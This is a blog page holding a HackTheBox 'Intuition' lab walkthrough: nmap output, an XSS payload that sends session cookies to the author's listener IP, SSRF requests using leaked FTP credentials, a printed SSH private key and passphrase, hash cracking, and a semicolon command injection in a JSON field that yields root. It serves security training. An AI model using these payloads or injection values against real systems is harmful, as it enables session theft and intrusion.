<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Intuition Writeup - HackTheBox | Rezy Dev</title>
<meta name="keywords" content="HackTheBox, Linux, Hard">
<meta name="description" content="Intuition is a hard Linux machine that starts with a CSRF attack and Python urllib CVE-2023-24329 to access server files and source code. Foothold leads to FTP access via LFI, with root gained by reversing a custom binary and exploiting Ansible CVE-2023-5115 for path traversal.">
<meta name="author" content="Me">
<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/intuition/">
<meta name="google-site-verification" content="XYZabc">
<meta name="yandex-verification" content="XYZabc">
<meta name="msvalidate.01" content="XYZabc">
<link crossorigin="anonymous" href="/assets/css/stylesheet.c8cc592602af07182c5c77ec685d5a345edaf450c20eb609706f559cb037baef.css" integrity="sha256-yMxZJgKvBxgsXHfsaF1aNF7a9FDCDrYJcG9VnLA3uu8=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackthebox/intuition/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><style>
    @media screen and (min-width: 769px) {
         
        .post-content input[type="checkbox"]:checked ~ label > img {
            transform: scale(1.6);
            cursor: zoom-out;
            position: relative;
            z-index: 999;
        }
    
        .post-content img.zoomCheck {
            transition: transform 0.15s ease;
            z-index: 999;
            cursor: zoom-in;
        }
    }
    </style><meta property="og:url" content="http://localhost:1313/writeups/hackthebox/intuition/">
  <meta property="og:site_name" content="Rezy Dev">
  <meta property="og:title" content="Intuition Writeup - HackTheBox">
  <meta property="og:description" content="Intuition is a hard Linux machine that starts with a CSRF attack and Python urllib CVE-2023-24329 to access server files and source code. Foothold leads to FTP access via LFI, with root gained by reversing a custom binary and exploiting Ansible CVE-2023-5115 for path traversal.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-09-15T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-09-15T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="Linux">
    <meta property="article:tag" content="Hard">
    <meta property="og:image" content="http://localhost:1313/feature.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://localhost:1313/feature.png">
<meta name="twitter:title" content="Intuition Writeup - HackTheBox">
<meta name="twitter:description" content="Intuition is a hard Linux machine that starts with a CSRF attack and Python urllib CVE-2023-24329 to access server files and source code. Foothold leads to FTP access via LFI, with root gained by reversing a custom binary and exploiting Ansible CVE-2023-5115 for path traversal.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Writeups",
      "item": "http://localhost:1313/writeups/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "HackTheBox",
      "item": "http://localhost:1313/writeups/hackthebox/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Intuition Writeup - HackTheBox",
      "item": "http://localhost:1313/writeups/hackthebox/intuition/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Intuition Writeup - HackTheBox",
  "name": "Intuition Writeup - HackTheBox",
  "description": "Intuition is a hard Linux machine that starts with a CSRF attack and Python urllib CVE-2023-24329 to access server files and source code. Foothold leads to FTP access via LFI, with root gained by reversing a custom binary and exploiting Ansible CVE-2023-5115 for path traversal.",
  "keywords": [
    "HackTheBox", "Linux", "Hard"
  ],
  "articleBody": " Link: https://app.hackthebox.com/machines/Intuition Difficulty Hard Machine Linux Enumeration Nmap Scan I started with an Nmap scan to identify open ports on the target machine. The scan revealed two open ports:\nPort 22: SSH Port 80: HTTP Next, I conducted an aggressive scan to gather more detailed information about the services running on these ports. The results provided insights into potential vulnerabilities and configurations that could be exploited.\n1 2 3 4 5 6 7 8 9 10 11 12 13 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLS2jzf8Eqy8cVa20hyZcem8rwAzeRhrMNEGdSUcFmv1FiQsfR4F9vZYkmfKViGIS3uL3X/6sJjzGxT1F/uPm/U= | 256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFj9hE1zqO6TQ2JpjdgvMm6cr6s6eYsQKWlROV4G6q+4 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://comprezzor.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel When I navigated to the web service running on port 80, I was greeted with the initial site. This gave me a first look at the target’s web interface and allowed me to begin assessing potential entry points or vulnerabilities in the web application.\nDuring my exploration, I discovered several subdomains associated with the target:\nreport.comprezzor.htb auth.comprezzor.htb dashboard.comprezzor.htb (requires login as an authorized user) User Flag To gain unauthorized access, I decided to attempt stealing cookies using a cross-site scripting (XSS) vulnerability. I used the bug report form on report.comprezzor.htb for this purpose. Here is the payload I used:\n1 \u003cscript\u003evar i=new Image(); i.src=\"http://10.10.14.102:80/?cookie=\"+btoa(document.cookie);\u003c/script\u003e This payload successfully captured the cookie by sending the cookie data to my server at http://10.10.14.102. With this session cookie, I could potentially access restricted areas like dashboard.comprezzor.htb, demonstrating a significant security flaw that could be exploited for further penetration testing.\nAfter countless attempts and troubleshooting, I finally managed to capture the session cookie. This involved restarting the processes and refining my methods multiple times, but persistence paid off.\n1 2 3 10.129.54.146 - - [28/Apr/2024 11:51:15] \"GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1\" 404 - 10.129.54.146 - - [28/Apr/2024 11:51:15] code 404, message File not found 10.129.54.146 - - [28/Apr/2024 11:51:15] \"GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1\" 404 - Using the stolen cookie, I accessed the “Create PDF Report” site. From here, I executed a Server-Side Request Forgery (SSRF) attack by manipulating the report URL to send a request to my own HTTP server. This allowed me to intercept and analyze the server’s response.\nThrough this SSRF attack, I received a new cookie:\n1 eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRzZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5 By leveraging the SSRF vulnerability, I noticed that the reply contained the following user agent:\n1 User-Agent: Python-urllib/3.11 This indicated that the application might be using a Python script to handle requests. Recognizing the potential for exploitation, I researched and found relevant exploits, including one discussed in this GitHub issue.\nUtilizing this CVE, I managed to retrieve the source code of the application via the SSRF attack. Access to the source code provided valuable insights into the internal workings of the application, including potential vulnerabilities and misconfigurations.\nUsing the SSRF vulnerability, I targeted the specific path where the application code was likely stored. By sending a request to fetch python3/app/code/app.py, I successfully retrieved the source code of the Flask application.\nBy analyzing the source code retrieved from python3/app/code/app.py, I developed a blueprint to help navigate and identify interesting components within the application. This blueprint focused on key areas such as routes, functions, and any hardcoded sensitive information.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 project_folder/ │ ├── app.py │ ├── blueprints/ │ ├── __init__.py │ │ │ ├── index/ │ │ ├── __init__.py │ │ └── index.py │ │ │ ├── report/ │ │ ├── __init__.py │ │ └── report.py │ │ │ ├── auth/ │ │ ├── __init__.py │ │ └── auth.py │ │ │ └── dashboard/ │ ├── __init__.py │ └── dashboard.py │ └── static/ ├── css/ ├── js/ └── ... With the useful code extracted from dashboard.py using the SSRF vulnerability, we can analyze it to identify critical functionalities, potential vulnerabilities, and further actions for exploitation.\n1 2 3 4 5 6 7 8 9 10 11 12 try: ftp = FTP('ftp.local') ftp.login(user='ftp_admin', passwd='u3jai8y71s2') ftp.cwd('/') with open(backup_filename, 'rb') as file: ftp.storbinary(f'STOR {backup_filename}', file) ftp.quit() os.remove(backup_filename) flash('Backup and upload completed successfully!', 'success') except Exception as e: flash(f'Error: {str(e)}', 'error') return redirect(url_for('dashboard.dashboard')) In the code above, I noticed FTP credentials. I’ll utilize the SSRF method to connect to this FTP.\n1 ftp://ftp_admin:u3jai8y71s2@ftp.local/ I used the FTP credentials as an SSRF payload from the previous step. We observed there is a private key. I attempt to view it.\nWith this payload, I will attempt to view the private key located at the following FTP URL: ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 -----BEGIN OPENSSH PRIVATE KEY----- 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 XxwXArPr6+HQe9hZSjI2hjYC2OU= -----END OPENSSH PRIVATE KEY----- There is also a passphrase “Y27SH19HDIWD” on the FTP server, which we can retrieve using the following payload:\nreport_url=++++ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt\nNow I will execute ssh-add to extract the username from the id_rsa file.\n1 2 3 4 ┌──(kali㉿kali)-[~/s5] └─$ ssh-add id_rsa Enter passphrase for id_rsa: Identity added: id_rsa (dev_acc@local) It indicates that the user is dev_acc. Now, I will SSH to the user using the command: ssh dev_acc@10.129.54.146 -i id_rsa.\nWe successfully obtained the user flag! 🚩\nRoot Flag Now, I’ll run LinPEAS by fetching it from my host system using a HTTP server created with Python.\n1 2 3 4 5 ╔══════════╣ Users with console adam:x:1002:1002:,,,:/home/adam:/bin/bash dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash lopez:x:1003:1003:,,,:/home/lopez:/bin/bash root:x:0:0:root:/root:/bin/bash After LinPEAS finished running, I made note of the users in case we might need them later.\nAdditionally, I found a users.db file in the blueprints directory. I will view its contents using cat to see if we can gather any information.\nThe users.db file contains a hash for the user “adam”. We can attempt to crack it using hashcat, John the Ripper, or any other preferred tool.\n1 2 3 4 5 6 7 ����P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�3�EtableusersusersCREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL, role TEXT DEFAULT 'user' ,�,##w��h�=adamsha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43webdevh�=adminsha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606admin ������ After cracking the hash for user “adam” using hashcat with the command:\n1 hashcat.exe -m 30120 myhash.txt rockyou.txt The credentials for user “adam” are:\n1 2 username: adam password: adam gray I conducted further enumeration and discovered valid credentials for another user.\n1 2 3 4 5 dev_acc@intuition:/$ zgrep -i lopez /var/log/suricata/*.gz /var/log/suricata/eve.json.7.gz:{\"timestamp\":\"2023-09-28T17:43:36.099184+0000\",\"flow_id\":1988487100549589,\"in_iface\":\"ens33\",\"event_type\":\"ftp\",\"src_ip\":\"192.168.227.229\",\"src_port\":37522,\"dest_ip\":\"192.168.227.13\",\"dest_port\":21,\"proto\":\"TCP\",\"tx_id\":1,\"community_id\":\"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=\",\"ftp\":{\"command\":\"USER\",\"command_data\":\"lopez\",\"completion_code\":[\"331\"],\"reply\":[\"Username ok, send password.\"],\"reply_received\":\"yes\"}} /var/log/suricata/eve.json.7.gz:{\"timestamp\":\"2023-09-28T17:43:52.999165+0000\",\"flow_id\":1988487100549589,\"in_iface\":\"ens33\",\"event_type\":\"ftp\",\"src_ip\":\"192.168.227.229\",\"src_port\":37522,\"dest_ip\":\"192.168.227.13\",\"dest_port\":21,\"proto\":\"TCP\",\"tx_id\":2,\"community_id\":\"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=\",\"ftp\":{\"command\":\"PASS\",\"command_data\":\"Lopezzz1992%123\",\"completion_code\":[\"530\"],\"reply\":[\"Authentication failed.\"],\"reply_received\":\"yes\"}} /var/log/suricata/eve.json.7.gz:{\"timestamp\":\"2023-09-28T17:44:32.133372+0000\",\"flow_id\":1218304978677234,\"in_iface\":\"ens33\",\"event_type\":\"ftp\",\"src_ip\":\"192.168.227.229\",\"src_port\":45760,\"dest_ip\":\"192.168.227.13\",\"dest_port\":21,\"proto\":\"TCP\",\"tx_id\":1,\"community_id\":\"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=\",\"ftp\":{\"command\":\"USER\",\"command_data\":\"lopez\",\"completion_code\":[\"331\"],\"reply\":[\"Username ok, send password.\"],\"reply_received\":\"yes\"}} /var/log/suricata/eve.json.7.gz:{\"timestamp\":\"2023-09-28T17:44:48.188361+0000\",\"flow_id\":1218304978677234,\"in_iface\":\"ens33\",\"event_type\":\"ftp\",\"src_ip\":\"192.168.227.229\",\"src_port\":45760,\"dest_ip\":\"192.168.227.13\",\"dest_port\":21,\"proto\":\"TCP\",\"tx_id\":2,\"community_id\":\"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=\",\"ftp\":{\"command\":\"PASS\",\"command_data\":\"Lopezz1992%123\",\"completion_code\":[\"230\"],\"reply\":[\"Login successful.\"],\"reply_received\":\"yes\"}} I obtained the password for user “lopez.” It is Lopezz1992%123. I used this password to access the account of user “lopez.”\nI also gained access to FTP using:\n1 2 3 4 5 6 7 8 9 lopez@intuition:~$ ftp adam@127.0.0.1 Connected to 127.0.0.1. 220 pyftpdlib 1.5.7 ready. 331 Username ok, send password. Password: adam gray 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls I retrieved all the cool stuff from there using the get command:\npayload.txt runner1 runner1.c run-tests.sh The “run-tests.sh” file contains:\n1 2 3 4 5 6 7 8 9 10 11 12 #!/bin/bash # List playbooks ./runner1 list # Run playbooks [Need authentication] # ./runner run [playbook number] -a [auth code] #./runner1 run 1 -a \"UHI75GHI****\" # Install roles [Need authentication] # ./runner install [role url] -a [auth code] #./runner1 install http://role.host.tld/role.tar -a \"UHI75GHI****\" The “runner1.c” file contains the authentication code, but it’s hashed in MD5. I will save it somewhere naming myhash.txt.\nI cracked the auth code from run-tests.sh file using the following command as we knew the first part of the authentication key **UHI75GHI******and the hash was available in runner1.c:\n1 hashcat.exe -a3 -m0 myhash.txt UHI75GHI?u?u?u?u --self-test-disable The cracked hash is UHI75GHINKOP.\nI created a file named “exploit.json” containing:\n1 2 3 4 5 6 7 { \"run\":{ \"action\":\"install\", \"role_file\":\"file.tar\" }, \"auth_code\":\"UHI75GHINKOP\" } We know the injection point is role_file. We need to perform command injection from role_file now. I renamed my file from file.tar to file.tar;bash. Now, I will adjust the payload in exploit.json accordingly.\n1 2 3 4 5 6 7 { \"run\":{ \"action\":\"install\", \"role_file\":\"file.tar;bash\" }, \"auth_code\":\"UHI75GHINKOP\" } I ran sudo /opt/runner2/runner2 exploit.json again.\n1 2 3 4 5 root@intuition:/home/lopez# cd ~ root@intuition:~# cat root.txt [ROOT_FLAG_R3DACT3D] root@intuition:~# id uid=0(root) gid=0(root) groups=0(root) Boom! We now have root access. 🎉🚀\nConclusion Thanks for following along with my walkthrough! Using various tools and techniques, we successfully identified vulnerabilities, exploited them, and gained root access. Keep exploring and happy hacking!\n",
  "wordCount" : "1482",
  "inLanguage": "en",
  "image":"http://localhost:1313/feature.png","datePublished": "2024-09-15T00:00:00Z",
  "dateModified": "2024-09-15T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Me"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/writeups/hackthebox/intuition/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Rezy Dev",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="rezydev.xyz (Alt + H)">rezydev.xyz</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/about/" title="👨🏼‍💻 About">
                    <span>👨🏼‍💻 About</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/writeups/" title="✍️ Writeups">
                    <span>✍️ Writeups</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="📂 Archives">
                    <span>📂 Archives</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="🏷️ Tags">
                    <span>🏷️ Tags</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="🔍 Search (Alt &#43; /)" accesskey=/>
                    <span>🔍 Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/hackthebox/">HackTheBox</a></div>
    <h1 class="post-title entry-hint-parent">
      Intuition Writeup - HackTheBox
    </h1>
    <div class="post-description">
      Intuition is a hard Linux machine that starts with a CSRF attack and Python urllib CVE-2023-24329 to access server files and source code. Foothold leads to FTP access via LFI, with root gained by reversing a custom binary and exploiting Ansible CVE-2023-5115 for path traversal.
    </div>
    <div class="post-meta"><span title='2024-09-15 00:00:00 +0000 UTC'>September 15, 2024</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1482 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href="https://github.com/Rezy-Dev/Rezy-Dev.github.io/tree/master/content/writeups/HackTheBox/Intuition/index.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>

</div>
  </header> 
<figure class="entry-cover">
            <img loading="eager" src="http://localhost:1313/writeups/hackthebox/intuition/feature.png" alt="">
        
</figure><div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#enumeration">Enumeration</a>
      <ul>
        <li><a href="#nmap-scan"><strong>Nmap Scan</strong></a></li>
      </ul>
    </li>
    <li><a href="#user-flag">User Flag</a></li>
    <li><a href="#root-flag">Root Flag</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><table>
  <thead>
      <tr>
          <th>Link:</th>
          <th><a href="https://app.hackthebox.com/machines/Intuition">https://app.hackthebox.com/machines/Intuition</a></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Difficulty</td>
          <td>Hard</td>
      </tr>
      <tr>
          <td>Machine</td>
          <td>Linux</td>
      </tr>
  </tbody>
</table>
<hr>
<h2 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h2>
<h3 id="nmap-scan"><strong>Nmap Scan</strong><a hidden class="anchor" aria-hidden="true" href="#nmap-scan">#</a></h3>
<p>I started with an Nmap scan to identify open ports on the target machine. The scan revealed two open ports:</p>
<ul>
<li>Port 22: SSH</li>
<li>Port 80: HTTP</li>
</ul>
<p>Next, I conducted an aggressive scan to gather more detailed information about the services running on these ports. The results provided insights into potential vulnerabilities and configurations that could be exploited.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">PORT   STATE SERVICE REASON  VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
</span></span><span class="line"><span class="cl">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLS2jzf8Eqy8cVa20hyZcem8rwAzeRhrMNEGdSUcFmv1FiQsfR4F9vZYkmfKViGIS3uL3X/6sJjzGxT1F/uPm/U=
</span></span><span class="line"><span class="cl">|   256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
</span></span><span class="line"><span class="cl">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFj9hE1zqO6TQ2JpjdgvMm6cr6s6eYsQKWlROV4G6q+4
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://comprezzor.htb/
</span></span><span class="line"><span class="cl">| http-methods: 
</span></span><span class="line"><span class="cl">|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></td></tr></table>
</div>
</div><p>When I navigated to the web service running on port 80, I was greeted with the initial site. This gave me a first look at the target&rsquo;s web interface and allowed me to begin assessing potential entry points or vulnerabilities in the web application.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-a19dd" hidden>
    <label for="zoomCheck-a19dd">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled.png" alt="Untitled" 
             />
    </label></p>
<p>During my exploration, I discovered several subdomains associated with the target:</p>
<ul>
<li><strong>report.comprezzor.htb</strong></li>
